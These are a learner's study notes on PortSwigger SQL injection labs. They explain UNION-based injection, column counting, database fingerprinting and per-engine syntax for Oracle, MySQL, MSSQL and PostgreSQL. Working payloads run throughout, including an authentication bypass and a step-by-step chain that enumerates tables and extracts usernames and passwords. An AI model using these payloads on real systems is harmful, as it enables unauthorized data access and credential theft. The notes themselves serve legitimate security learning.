# My Learnings

These are my personal notes from solving PortSwigger SQL injection labs. Writing this so I can come back and reference it without having to re-learn everything from scratch.

---

## What is SQL Injection

SQL injection is when a web application takes input from a user and drops it directly into a SQL query without sanitising it first. Because the input is not cleaned, I can break out of the intended query and write my own SQL logic alongside it.

The application thinks it is getting a product category name or a username. What it actually gets is a fragment of SQL that I crafted. The database cannot tell the difference between the application's code and my injected code, so it executes both.

A simple example. The application builds this query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

If I supply `' OR 1=1--` as the category, it becomes:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

The `OR 1=1` is always true. The `--` comments out everything after it. Every row in the table comes back.

---

## What Impact Can This Have

This is not just a theoretical bug. From my labs I have seen what is actually possible:

**Read hidden data** : rows that the application deliberately filters out (unreleased products, soft-deleted records) can be retrieved by making the WHERE clause always true.

**Bypass authentication** : if the login query checks username AND password, I can comment out the password check entirely and log in as any user including administrator.

**Enumerate the entire database** : I can pull table names, column names, and then the actual data out of any table the database user has access to.

**Fingerprint the database engine** : different databases expose different version functions and system views. I can identify exactly what software and version the backend is running.

**Extract credentials** : once I know the table and column names for user accounts, I can dump usernames and plaintext or hashed passwords.

---

## What Different Results I Have Obtained So Far

From the five labs I have completed:

| Lab | What I Got |
|---|---|
| WHERE clause injection | All hidden product rows including unreleased items |
| Login bypass | Admin session without knowing the password |
| Oracle version | Full Oracle 11g component version strings via `v$version` |
| MySQL version | `8.0.42-0ubuntu0.20.04.1` via `@@version` |
| Full enumeration | Table names, column names, and plaintext credentials for all users |

---

## The Different Database Systems and What Changes Between Them

This is the part that kept tripping me up. SQL injection works across all databases but the syntax is not identical. I need to know what system I am targeting before I can write the right payload.

### Oracle

Version query:
```sql
SELECT BANNER FROM v$version
```

Notes:
- Every SELECT must have a FROM clause. I cannot write `SELECT NULL` in Oracle. I have to write `SELECT NULL FROM dual` where `dual` is a built-in dummy table.
- Comment character: `--`
- Does not have `information_schema`. Use `all_tables` and `all_columns` instead.
- String concatenation uses `||` not `+`

```sql
-- List tables
SELECT table_name FROM all_tables

-- List columns in a specific table
SELECT column_name FROM all_columns WHERE table_name = 'USERS'
```

### MySQL

Version query:
```sql
SELECT @@version
```

Notes:
- Comment character: `--` BUT it must have a space after it (`-- `) otherwise MySQL does not treat it as a comment. The `-- -` pattern works reliably because the trailing character ensures the space is preserved after URL decoding.
- Also supports `#` as a comment but this often gets URL-encoded to `%23` and fails.
- Has `information_schema` so the standard enumeration chain works.
- String concatenation uses `CONCAT()` function.

```sql
-- Works in MySQL
' UNION SELECT @@version,NULL-- -

-- Does NOT work reliably
' UNION SELECT @@version,NULL--
' UNION SELECT @@version,NULL#
```

### Microsoft SQL Server

Version query:
```sql
SELECT @@version
```

Notes:
- Comment character: `--` (no trailing space needed, unlike MySQL)
- Has `information_schema` so standard enumeration chain works.
- String concatenation uses `+`
- Stacked queries allowed in some contexts (separating statements with `;`)
- Has a `xp_cmdshell` stored procedure that can execute OS commands if enabled

```sql
-- List tables
SELECT table_name FROM information_schema.tables

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
```

### PostgreSQL

Version query:
```sql
SELECT version()
```

Notes:
- Comment character: `--`
- Has `information_schema` so standard enumeration chain works.
- String concatenation uses `||`
- Has `pg_sleep()` for time-based blind injection
- All the system tables I enumerated in Lab 05 starting with `pg_` are PostgreSQL's own internal tables

```sql
-- Works in PostgreSQL
SELECT version()

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'
```

### Quick Reference Table

| Database | Version Query | Comment | String Concat | Dummy Table |
|---|---|---|---|---|
| Oracle | `SELECT BANNER FROM v$version` | `--` | `||` | `dual` |
| MySQL | `SELECT @@version` | `-- -` or `#` | `CONCAT()` | not needed |
| Microsoft | `SELECT @@version` | `--` | `+` | not needed |
| PostgreSQL | `SELECT version()` | `--` | `||` | not needed |

---

## Comment Characters

Getting the comment right is critical. If the comment does not work, the rest of the original query stays active and usually causes a syntax error that breaks everything.

```sql
-- Oracle, PostgreSQL, Microsoft SQL Server
--

-- MySQL (needs trailing whitespace)
-- -
-- followed by a space

-- MySQL alternative (often fails due to URL encoding)
#
```

The reason `-- -` works for MySQL: when the URL is decoded, the space between `--` and `-` satisfies MySQL's parser requirement for whitespace after the double dash. The extra `-` itself is harmless, it just ensures the space does not get stripped.

---

## UNION, SELECT, WHERE : How I Use These

### UNION

UNION lets me attach a completely separate SELECT statement to the end of the original query and have its results returned alongside the original results.

```sql
' UNION SELECT column1, column2 FROM another_table--
```

Rules I have to follow:
1. The number of columns in my SELECT must match the number of columns in the original query.
2. The data types in my SELECT must be compatible with the original columns.

### SELECT

SELECT picks which columns to return. In injection I use it to pull specific data:

```sql
SELECT table_name, NULL FROM information_schema.tables
SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'
SELECT username, password FROM users
```

### WHERE

WHERE filters which rows are returned. I use it in two ways:

First, to break out of the intended filter and return everything:
```sql
WHERE category = '' OR 1=1--
```

Second, when I am querying metadata views, to filter down to what I actually want:
```sql
WHERE table_name = 'users_qtulzy'
```

---

## NULL and Finding the Number of Columns

Before I can use UNION injection, I need to know exactly how many columns the original query returns. If I guess wrong I get a database error and nothing comes back.

### Why NULL Works as a Placeholder

NULL is compatible with every data type in SQL. If the original column is an integer and I put a string in my UNION, I get a type mismatch error. NULL does not cause that. So I use NULL to fill every column I do not need actual data from.

### How to Find the Column Count

The method is to start with one column and keep adding NULLs until the query succeeds instead of erroring.

```sql
-- Try 1 column
' UNION SELECT NULL--

-- Try 2 columns
' UNION SELECT NULL,NULL--

-- Try 3 columns
' UNION SELECT NULL,NULL,NULL--
```

When the error disappears and the page loads normally, I have found the right column count.

### Finding Which Column Accepts a String

Once I know the column count, I need to find which position accepts string data (because I want to read version strings, table names, etc). I replace one NULL at a time with a test string:

```sql
-- 2 column example, testing which column accepts a string
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--
```

Whichever one does not error is where I can put my actual data payload.

---

## The Full Enumeration Chain (Non-Oracle)

This is the pattern I used in Lab 05. It applies to MySQL, PostgreSQL, and Microsoft SQL Server.

```sql
-- Step 1: Find column count (keep adding NULLs until no error)
' UNION SELECT NULL,NULL--

-- Step 2: Get all table names
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Step 3: Get column names from the interesting table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target_table'--

-- Step 4: Extract the actual data
' UNION SELECT username_col,password_col FROM target_table--
```

For Oracle the same chain uses different views:

```sql
-- Step 2 Oracle equivalent
' UNION SELECT table_name,NULL FROM all_tables--

-- Step 3 Oracle equivalent
' UNION SELECT column_name,NULL FROM all_columns WHERE table_name='TARGET_TABLE'--
```

---

## Things That Kept Catching Me Out

**MySQL comment syntax** : I spent a lot of time on Lab 04 because `--` without a space does not work in MySQL. Always use `-- -` for MySQL.

**Oracle needs FROM dual** : if I try `SELECT NULL` in Oracle without `FROM dual` I get an error. Oracle always needs a FROM clause.

**Column count must match exactly** : one too many or one too few NULLs and the UNION fails. No shortcuts here.

**Randomised column names in labs** : Lab 05 used `username_opexiv` and `password_cfjpjy`. The lab does this to force proper enumeration. In real applications column names are predictable but the enumeration step is still always necessary.

**URL encoding** : characters like `'` become `%27`, spaces become `+` or `%20`, `#` becomes `%23`. The browser or tools do this automatically but it matters when I am manually crafting URLs. A `#` comment in MySQL often fails because it gets encoded before reaching the server.

---

## What to Always Check When Starting an Injection

1. Confirm there is injection by adding a single quote `'` and watching for an error or a change in behaviour.
2. Find the column count using incremental NULLs.
3. Identify which columns accept strings.
4. Fingerprint the database using version queries (try `@@version` first for MySQL/MSSQL, then `version()` for PostgreSQL, then `v$version` for Oracle).
5. Enumerate tables via `information_schema.tables` or `all_tables`.
6. Enumerate columns for the interesting table.
7. Extract the data.

---
